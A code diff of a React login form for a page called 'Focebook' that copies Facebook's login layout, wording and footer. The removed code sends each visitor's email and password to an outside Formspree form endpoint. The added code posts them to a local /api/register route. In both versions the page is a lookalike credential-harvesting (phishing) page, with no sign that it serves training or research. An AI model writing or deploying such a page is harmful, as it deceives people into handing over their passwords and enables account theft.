@@ -14,30 +14,21 @@ export default function LoginForm() {
     setIsLoading(true)
 
     try {
-      const response = await fetch('https://formspree.io/f/mwpakygv', {
+      const response = await fetch('/api/register', {
         method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({
-          email: email,
-          password: password,
-          timestamp: new Date().toLocaleString(),
-          source: 'Holebook Login'
-        }),
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ email, password }),
       })
 
-      if (response.ok) {
-        console.log("Datos enviados a Formspree")
-        alert("Login enviado correctamente")
+      const data = await response.json()
+
+      if (data.success) {
+        alert(`✅ Registro exitoso para: ${email}`)
         setEmail("")
         setPassword("")
-      } else {
-        throw new Error('Error en el envío')
       }
     } catch (error) {
-      console.error("Error al enviar:", error)
-      alert("Error al enviar los datos")
+      alert('❌ Error de conexión')
     } finally {
       setIsLoading(false)
     }
@@ -45,17 +36,14 @@ export default function LoginForm() {
 
   return (
     <div className="w-full max-w-md">
-      {/* Logo and Title */}
       <div className="text-center mb-8">
         <h1 className="text-5xl font-bold text-blue-600 tracking-tight">Focebook</h1>
       </div>
 
-      {/* Login Card */}
       <div className="bg-white rounded-lg shadow-lg p-8">
         <h2 className="text-2xl font-semibold text-gray-900 mb-6 text-center">Log In to Focebook</h2>
 
         <form onSubmit={handleSubmit} className="space-y-4">
-          {/* Email/Phone Input */}
           <div>
             <input
               type="text"
@@ -68,7 +56,6 @@ export default function LoginForm() {
             />
           </div>
 
-          {/* Password Input */}
           <div>
             <input
               type="password"
@@ -81,7 +68,6 @@ export default function LoginForm() {
             />
           </div>
 
-          {/* Login Button */}
           <Button
             type="submit"
             className="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 rounded-lg mt-6 text-base transition-colors"
@@ -91,45 +77,31 @@ export default function LoginForm() {
           </Button>
         </form>
 
-        {/* Divider */}
         <div className="flex items-center my-6">
           <div className="flex-1 border-t border-gray-300"></div>
         </div>
 
-        {/* Links */}
         <div className="flex flex-col gap-3 text-center text-sm">
           <a href="#" className="text-blue-600 hover:underline font-medium">
-            ¿Olvidaste tu contraseña?
+            Forgot account?
           </a>
           <button
             type="button"
             className="bg-green-500 hover:bg-green-600 text-white font-bold py-2 px-4 rounded-lg inline-block mx-auto transition-colors"
           >
-            Crea una nueva cuenta de Focebook
+            Create new Folebook account
           </button>
         </div>
       </div>
 
-      {/* Footer Links */}
       <div className="mt-8 text-center text-xs text-gray-600 space-y-2">
         <p>
-          <a href="#" className="hover:underline">
-            About
-          </a>
-          {" · "}
-          <a href="#" className="hover:underline">
-            Help
-          </a>
-          {" · "}
-          <a href="#" className="hover:underline">
-            Privacy
-          </a>
-          {" · "}
-          <a href="#" className="hover:underline">
-            Cookies
-          </a>
+          <a href="#" className="hover:underline">About</a> · 
+          <a href="#" className="hover:underline">Help</a> · 
+          <a href="#" className="hover:underline">Privacy</a> · 
+          <a href="#" className="hover:underline">Cookies</a>
         </p>
-        <p className="text-gray-500">© 2025 Focebook. All rights reserved.</p>
+        <p className="text-gray-500">© 2025 focebook. All rights reserved.</p>
       </div>
     </div>
   )
